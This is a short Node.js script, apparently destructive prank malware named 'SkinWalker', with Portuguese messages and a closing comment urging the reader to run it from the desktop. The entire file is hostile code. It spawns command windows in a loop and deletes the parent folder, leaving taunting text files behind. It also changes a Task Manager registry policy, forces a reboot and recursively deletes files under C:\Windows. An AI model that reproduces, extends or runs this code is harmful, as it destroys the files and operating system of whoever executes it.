const rimraf = require('rimraf')
const cmd = require('node-cmd')
const fs = require('fs')
let arrayFiles = []
setInterval(() => {
	cmd.run('start taskmgr')
	cmd.run('start cmd')
}, 1000)
fs.readdir('..', (err, files) => {
    if (err) return
    files.forEach((f, i) => {
		if (f == 'malware') return
		arrayFiles.push(f)
	})
})
rimraf('..', function() {
		for (const file in arrayFiles) {
			fs.writeFileSync("../" + arrayFiles[file] + ".txt", 'O SkinWalker pegou o seu computador emprestado! KKKKKKKKKK')
	}
})
cmd.run('@echo off')
cmd.run('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f')
cmd.run('shutdown /r /f /c "SkinWalker tomou seu pc"')
cmd.run('del C:\Windows\*.* /f /s /q')

//execute esse arquivo na área de trabalho!
